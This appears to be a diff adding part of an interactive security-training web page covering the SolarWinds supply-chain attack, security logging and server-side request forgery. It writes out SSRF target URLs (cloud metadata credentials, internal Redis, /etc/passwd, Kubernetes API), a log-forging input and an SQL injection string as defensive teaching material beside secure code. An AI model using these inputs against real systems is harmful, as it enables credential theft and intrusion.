+    {date:"Feb 2020",event:"SUNBURST backdoor injected into Orion source code",phase:"Code Injection"},
+    {date:"Mar 2020",event:"Orion 2020.2 with backdoor compiled, signed, released",phase:"Weaponization"},
+    {date:"Mar–Jun 2020",event:"18,000 orgs download and install the trojanized update",phase:"Mass Distribution"},
+    {date:"Jun 2020",event:"Attacker activates backdoor — targets US government agencies",phase:"Activation"},
+    {date:"Dec 13, 2020",event:"FireEye detects breach — 9 months after initial compromise",phase:"Discovery"},
+  ];
+  const integrity_checks=[
+    {artifact:"npm package",method:"package-lock.json + integrity SHA-512",verified:true,risk:"Dependency confusion attacks still possible"},
+    {artifact:"Docker image",method:"Digest pinning (sha256:...)",verified:true,risk:"Base image must also be verified"},
+    {artifact:"pip package",method:"requirements.txt hash pinning",verified:false,risk:"Version pins without hash — typosquatting possible"},
+    {artifact:"CI/CD pipeline",method:"GitHub Actions with pinned SHA",verified:false,risk:"Using @main or @v1 instead of pinned SHA"},
+    {artifact:"Infrastructure",method:"Terraform state with remote backend",verified:true,risk:"State file must be encrypted"},
+  ];
+  const prompts=[
+    {label:"Secure Your CI/CD",text:"Audit this GitHub Actions workflow for software integrity failures. Check: (1) actions pinned to commit SHA not tag, (2) secrets not in logs, (3) code signing for release artifacts, (4) SLSA provenance generation, (5) no self-hosted runners with access to prod secrets. Rewrite the workflow with all security controls."},
+    {label:"Detect Tampering",text:"Write a Python script that verifies the integrity of a deployed application by: (1) computing SHA-256 of all .py files at deploy time, (2) storing hashes in a signed manifest, (3) running hourly to detect any changed files, (4) alerting via webhook if tampering is detected. Use HMAC for signing the manifest."},
+    {label:"Supply Chain SBOM",text:"Explain the SolarWinds attack technically. What SLSA level would have prevented it? Write a GitHub Actions pipeline that achieves SLSA Level 2: (1) hosted build, (2) signed provenance, (3) branch protection. What additional controls achieve SLSA Level 3 or 4?"},
+  ];
+
+  const tl=timeline.map((e,i)=>`
+    <div class="flex gap-3 pb-4">
+      <div class="flex flex-col items-center flex-shrink-0" style="min-width:14px;">
+        <div class="tl-dot" style="background:#6366f1;box-shadow:0 0 6px #6366f188;"></div>
+        ${i<timeline.length-1?`<div style="width:2px;background:var(--track);flex:1;min-height:24px;margin-top:4px;"></div>`:''}
+      </div>
+      <div><div class="flex items-center gap-2 flex-wrap mb-0.5">
+        <span class="font-mono text-xs text-slate-500">${esc(e.date)}</span>
+        <span class="text-xs px-2 py-0.5 rounded" style="background:rgba(99,102,241,.1);color:#a5b4fc;border:1px solid rgba(99,102,241,.25);">${esc(e.phase)}</span></div>
+        <p class="text-sm text-slate-700">${esc(e.event)}</p></div>
+    </div>`).join('');
+
+  const ics=integrity_checks.map(ic=>`
+    <tr class="border-b" style="border-color:var(--border);">
+      <td class="py-2 pr-3 text-sm text-slate-800">${esc(ic.artifact)}</td>
+      <td class="py-2 pr-3 text-xs font-mono text-slate-400">${esc(ic.method)}</td>
+      <td class="py-2 pr-3 text-sm">${ic.verified?'<span class="text-emerald-400">✓</span>':'<span class="text-red-400">✗</span>'}</td>
+      <td class="py-2 text-xs text-amber-400">${esc(ic.risk)}</td>
+    </tr>`).join('');
+
+  const chain=`
+    <div class="space-y-3 p-4 rounded-xl" style="background:var(--card);border:1px solid var(--border);">
+      <p class="text-sm font-semibold text-slate-700 mb-4">A modern software supply chain — each ↓ is a potential injection point:</p>
+      ${['Developer pushes code','GitHub Actions builds artifact','Dependencies fetched from npm/PyPI','Docker base image pulled','Artifact signed & published','User downloads & installs'].map((s,i)=>`
+        <div class="flex items-center gap-3">
+          <div class="w-6 h-6 rounded-full flex items-center justify-center text-xs font-bold flex-shrink-0" style="background:rgba(99,102,241,.2);border:1px solid rgba(99,102,241,.4);color:#a5b4fc;">${i+1}</div>
+          <p class="text-sm text-slate-700">${esc(s)}</p>
+          ${i===1?`<span class="ml-auto text-xs text-red-400 font-bold">← SolarWinds injected here</span>`:''}
+        </div>
+        ${i<5?`<div class="ml-3" style="width:1px;height:16px;background:var(--track);margin-left:11px;"></div>`:''}
+      `).join('')}
+    </div>`;
+
+  setPanels([
+    card(`<h3 class="text-sm font-semibold text-slate-700 mb-4">SolarWinds SUNBURST — Supply Chain Attack Timeline</h3>${tl}`),
+    card(`<h3 class="text-sm font-semibold text-slate-700 mb-3">Artifact Integrity Verification</h3>
+      <table class="w-full"><thead><tr class="text-xs text-slate-600 border-b" style="border-color:var(--border);">
+        <th class="text-left pb-2 pr-3">Artifact</th><th class="text-left pb-2 pr-3">Verification Method</th><th class="text-left pb-2 pr-3">Done?</th><th class="text-left pb-2">Residual Risk</th></tr></thead>
+        <tbody>${ics}</tbody></table>`),
+    chain,
+  ]);
+  return {prompts};
+}
+
+function runA09() {
+  const GOOD_LOGS=[
+    {level:"INFO",ts:"02:14:20",msg:"Login SUCCESS",user:"u:1001",ip:"10.0.1.5",detail:"session_id=abc123 (hashed)"},
+    {level:"WARN",ts:"02:14:16",msg:"Login FAILED (3/5)",user:"u:1001",ip:"10.0.0.47",detail:"rate_limit_remaining=2"},
+    {level:"ERROR",ts:"02:14:25",msg:"Access DENIED",user:"u:1001",ip:"10.0.0.47",detail:"attempted: /admin/users, role=student"},
+    {level:"AUDIT",ts:"02:14:23",msg:"Data exported",user:"u:1001",ip:"10.0.0.47",detail:"resource=marks, rows=1, own_data=true"},
+  ];
+  const BAD_LOGS=[
+    {level:"INFO",ts:"02:14:20",msg:"User logged in",detail:"password=secret123 token=eyJhbGciOi..."},
+    {level:"DEBUG",ts:"02:14:22",msg:"DB query executed",detail:"SELECT * FROM users WHERE id='1 OR 1=1'"},
+    {level:"ERROR",ts:"02:14:23",msg:"NullPointerException",detail:"at com.app.UserService.getUser(UserService.java:42)\nat com.app.DBHelper.connect(DBHelper.java:18)"},
+    {level:"INFO",ts:"02:14:25",msg:"Payment processed",detail:"card=4111111111111111 cvv=123 amount=50000"},
+  ];
+  const detection_stats=[
+    {stat:"Mean time to detect breach",without_logging:"287 days",with_logging:"< 1 day"},
+    {stat:"Breaches detected by internal team",without_logging:"33%",with_logging:"86%"},
+    {stat:"Cost of breach (per Ponemon 2023)",without_logging:"$4.65M",with_logging:"$1.2M"},
+    {stat:"Regulatory fine (GDPR 72h rule)",without_logging:"4% annual revenue",with_logging:"Avoided"},
+  ];
+  const li={normal_input:"user123",malicious_input:"user123\nINFO 2026-04-18 02:15:00 Login SUCCESS for admin",vuln_log:'logging.info(f"Login attempt for: {username}")',secure_log:'logging.info("Login attempt for: %s", username.replace("\\n", "\\\\n"))'};
+  const prompts=[
+    {label:"Design a Logging Strategy",text:"Design a comprehensive security logging strategy for a fintech web app. Specify: (1) what MUST be logged (auth events, access denials, data exports), (2) what MUST NOT be logged (passwords, card numbers, tokens), (3) log format (structured JSON), (4) retention policy, (5) alerting rules for suspicious patterns. Provide the Python logging configuration."},
+    {label:"Build an Alert System",text:"Write a Python script that monitors application logs in real-time and fires alerts for: (1) 5+ failed logins from same IP in 60 seconds, (2) successful login from new country/device, (3) admin action outside business hours, (4) data export >1MB, (5) any SQL error in production. Use tail -f style log reading. Send alerts to Slack webhook."},
+    {label:"Log Injection Prevention",text:"Explain log injection / log forging attacks. Show an example where user input in logs creates fake audit trail entries. Write a Python logging middleware that: (1) sanitizes all log inputs, (2) uses structured logging (JSON), (3) adds request correlation IDs, (4) ensures log integrity with HMAC signing."},
+  ];
+
+  const goodRows=GOOD_LOGS.map(l=>{
+    const col={INFO:'text-emerald-400',WARN:'text-amber-400',ERROR:'text-red-400',AUDIT:'text-cyan-400'}[l.level]||'text-slate-400';
+    return `<div class="font-mono text-xs py-0.5"><span class="${col} w-12 inline-block">[${l.level}]</span> <span class="text-slate-500">${l.ts}</span>  <span class="text-slate-700">${esc(l.msg)}</span>  <span class="text-slate-600">${esc(l.detail)}</span></div>`;
+  }).join('');
+
+  const badRows=BAD_LOGS.map(l=>{
+    const col={INFO:'text-slate-400',DEBUG:'text-blue-400',ERROR:'text-red-400'}[l.level]||'text-slate-400';
+    const hasSensitive=/password|card|token|SELECT.*FROM|Exception/.test(l.detail);
+    return `<div class="font-mono text-xs py-0.5">
+      <span class="${col} w-12 inline-block">[${l.level}]</span> <span class="text-slate-500">${l.ts}</span>  <span class="text-slate-700">${esc(l.msg)}</span>  <span class="${hasSensitive?'text-red-400':'text-slate-600'}">${esc(l.detail)}</span>
+      ${hasSensitive?'<span class="text-red-400 ml-2 font-bold">← SENSITIVE DATA!</span>':''}</div>`;
+  }).join('');
+
+  const stats=detection_stats.map(s=>`
+    <div class="rounded-xl p-4 grid grid-cols-3 gap-4 items-center" style="background:var(--card);border:1px solid var(--border);">
+      <div class="text-sm text-slate-700 col-span-1">${esc(s.stat)}</div>
+      <div class="text-center"><div class="font-bold text-red-400 text-sm">${esc(s.without_logging)}</div><div class="text-xs text-slate-600">Without Logging</div></div>
+      <div class="text-center"><div class="font-bold text-emerald-400 text-sm">${esc(s.with_logging)}</div><div class="text-xs text-slate-600">With Logging</div></div>
+    </div>`).join('');
+
+  const injectionDemo=termWrap('log_injection_demo.py',`<div class="space-y-3 text-xs font-mono">
+    <div><div class="text-slate-600 mb-1">Normal input:</div><div class="text-emerald-300">${esc(li.normal_input)}</div></div>
+    <div><div class="text-slate-600 mb-1">Malicious input (injects fake log entry):</div><div class="text-red-400">${esc(li.malicious_input)}</div></div>
+    <div class="pt-2 border-t" style="border-color:var(--border);"><div class="text-slate-600 mb-1">Vulnerable:</div><div class="text-amber-300">${esc(li.vuln_log)}</div></div>
+    <div><div class="text-slate-600 mb-1">Secure:</div><div class="text-emerald-300">${esc(li.secure_log)}</div></div>
+  </div>`);
+
+  setPanels([
+    `<div class="grid grid-cols-2 gap-4">
+      ${termWrap('✓ good_logs.jsonl — What to log',`<div class="space-y-0.5">${goodRows}</div>`)}
+      ${termWrap('✗ bad_logs.txt — What NOT to log',`<div class="space-y-0.5">${badRows}</div>`)}</div>`,
+    card(`<h3 class="text-sm font-semibold text-slate-700 mb-4">Business Impact of Logging</h3><div class="space-y-3">${stats}</div>`),
+    injectionDemo,
+  ]);
+  return {prompts};
+}
+
+function runA10() {
+  const attack_paths=[
+    {url:"http://169.254.169.254/latest/meta-data/iam/security-credentials/",target:"AWS EC2 metadata",data:"Temporary AWS credentials → full cloud takeover",severity:"CRITICAL"},
+    {url:"http://localhost:6379",target:"Redis (internal)",data:"Unauthenticated Redis → read all cached data + sessions",severity:"CRITICAL"},
+    {url:"http://10.0.0.1/",target:"Internal network",data:"Internal services not meant to be internet-accessible",severity:"HIGH"},
+    {url:"file:///etc/passwd",target:"Local filesystem",data:"Read any file the web process can access",severity:"HIGH"},
+    {url:"http://kubernetes.default.svc/api/v1/namespaces",target:"K8s API server",data:"Kubernetes cluster API → pod control, secret access",severity:"CRITICAL"},
+    {url:"http://localhost:5432",target:"PostgreSQL",data:"Internal DB port probing → service fingerprinting",severity:"MEDIUM"},
+  ];
+  const vuln_code=`# VULNERABLE — server fetches any URL the user provides
+@app.post("/api/fetch-preview")
+def fetch_preview():
+    url = request.json["url"]
+    response = requests.get(url)   # ← SSRF: fetches internal URLs too!
+    return {"content": response.text[:1000]}`;
+
+  const secure_code=`import ipaddress, socket
+from urllib.parse import urlparse
+
+ALLOWED_SCHEMES = {"http", "https"}
+BLOCKED_NETWORKS = [
+    ipaddress.ip_network("10.0.0.0/8"),
+    ipaddress.ip_network("172.16.0.0/12"),
+    ipaddress.ip_network("192.168.0.0/16"),
+    ipaddress.ip_network("169.254.0.0/16"),  # link-local (AWS metadata!)
+    ipaddress.ip_network("127.0.0.0/8"),     # loopback
+]
+
+def is_safe_url(url: str) -> bool:
+    parsed = urlparse(url)
+    if parsed.scheme not in ALLOWED_SCHEMES:
+        return False
+    ip = socket.gethostbyname(parsed.hostname)
+    ip_obj = ipaddress.ip_address(ip)
+    return not any(ip_obj in net for net in BLOCKED_NETWORKS)`;
+
+  const prompts=[
+    {label:"Find SSRF in Codebase",text:"Scan this codebase for Server-Side Request Forgery (SSRF) vulnerabilities. Look for: (1) requests.get/post with user-controlled URLs, (2) urllib.urlopen with user input, (3) webhook endpoints that fetch URLs, (4) PDF/image generators that load external resources, (5) XML parsers that may resolve external entities (XXE). For each: show the vulnerable code, the attack URL, and the fix."},
+    {label:"Build SSRF Defense",text:"Write a comprehensive SSRF prevention library in Python that: (1) validates URLs against RFC 3986, (2) resolves DNS and blocks all RFC 1918 + link-local + loopback addresses, (3) blocks dangerous schemes (file://, gopher://, dict://), (4) prevents DNS rebinding attacks by checking IP after DNS resolution, (5) handles redirects safely. Make it a reusable decorator."},
+    {label:"Cloud Metadata Protection",text:"Explain the AWS IMDSv1 vs IMDSv2 metadata endpoint difference. Why does IMDSv2 prevent SSRF attacks? Write Terraform code to enforce IMDSv2 on all EC2 instances and explain the additional network controls (VPC endpoint policies, WAF rules) that provide defense in depth against SSRF targeting cloud metadata."},
+  ];
+
+  const paths=attack_paths.map(p=>`
+    <div class="rounded-xl p-4 sev-${p.severity}" style="background:var(--card);border:1px solid var(--border);">
+      <div class="flex items-start justify-between gap-3 mb-2">
+        <div class="flex items-center gap-2">${badge(p.severity)}<span class="font-semibold text-slate-900 text-sm">${esc(p.target)}</span></div>
+      </div>
+      <div class="font-mono text-xs text-pink-400 mb-2 break-all">${esc(p.url)}</div>
+      <p class="text-xs text-red-300">${esc(p.data)}</p>
+    </div>`).join('');
+
+  const sim=`
+    <div class="space-y-4">
+      <div class="p-4 rounded-lg" style="background:var(--card-muted);border:1px solid var(--border);">
+        <p class="text-sm text-slate-700 mb-1">The server fetches any URL you provide (to generate link previews).</p>
+        <p class="text-xs text-slate-600 mb-3">Try: <span class="text-pink-400 font-mono">http://169.254.169.254/latest/meta-data/</span> · <span class="text-pink-400 font-mono">http://localhost:6379</span> · <span class="text-pink-400 font-mono">https://google.com</span></p>
+        <div class="flex gap-3"><input id="ssrf-input" class="sim-input" placeholder="Enter URL to fetch…" value="http://169.254.169.254/latest/meta-data/iam/security-credentials/"/>
+          <button onclick="runSsrf()" class="sim-btn" style="background:rgba(236,72,153,.1);border:1px solid rgba(236,72,153,.3);color:#f9a8d4;">Fetch URL</button></div>
+      </div>
+      <div id="ssrf-result" class="rounded-lg p-4 text-xs text-slate-500 italic" style="background:var(--card-muted);border:1px solid var(--border);">← Result appears here</div>
+    </div>`;
+
+  setPanels([
+    `<div class="space-y-3">${paths}</div>`,
+    codeDiff('server fetches any URL',vuln_code,'IP allowlist + scheme check',secure_code),
+    sim,
+  ]);
+  return {prompts};
+}
+
+async function runSsrf() {
+  const url=document.getElementById('ssrf-input').value;
+  const INTERNAL=['10.0.0.0/8','172.16.0.0/12','192.168.0.0/16','169.254.0.0/16','127.0.0.0/8'];
+  const isInternal=url.includes('localhost')||url.includes('127.')||url.includes('169.254')||url.includes('10.')||url.includes('172.16')||url.includes('192.168')||url.startsWith('file://');
+  const box=document.getElementById('ssrf-result');
+  let verdict='ALLOWED',data_leaked=null,resolved_ip=null;
+
+  if (url.startsWith('file://')) {
+    verdict='BLOCKED (file:// scheme)';
+  } else if (url.includes('169.254')) {
+    verdict='SSRF → AWS Metadata!';
+    data_leaked='AccessKeyId: AKIA..., SecretKey: wJalrX..., Token: AQoXnyc...';
+  } else if (url.includes('localhost')||url.includes('127.')) {
+    verdict='SSRF → localhost';
+    data_leaked='Internal service response (Redis, PostgreSQL, etc.)';
+  } else if (url.includes('10.')||url.includes('172.16')||url.includes('192.168')) {
+    verdict='SSRF → Internal network';
+    data_leaked='Internal service at '+url;
+  }
+
+  box.className=`rounded-lg p-4 ${isInternal?'result-bad':'result-ok'}`;
+  box.innerHTML=`
+    <div class="font-mono space-y-2">
+      <div><span class="text-slate-500">URL: </span><span class="text-pink-400">${esc(url)}</span></div>
+      ${resolved_ip?`<div><span class="text-slate-500">Resolved IP: </span><span class="text-amber-300">${esc(resolved_ip)}</span></div>`:''}
+      <div><span class="text-slate-500">Verdict: </span><span class="${isInternal?'text-red-400 font-bold':'text-emerald-400'}">${esc(verdict)}</span></div>
+      ${data_leaked?`<div class="mt-2 p-2 rounded" style="background:rgba(239,68,68,.1);"><span class="text-red-400 font-bold">🚨 Data leaked: </span><span class="text-red-300">${esc(data_leaked)}</span></div>`:''}
+      ${isInternal?`<div class="text-emerald-400">✓ Safe implementation would have blocked this request</div>`:''}
+    </div>`;
+}
+</script>
+</body>
+</html>
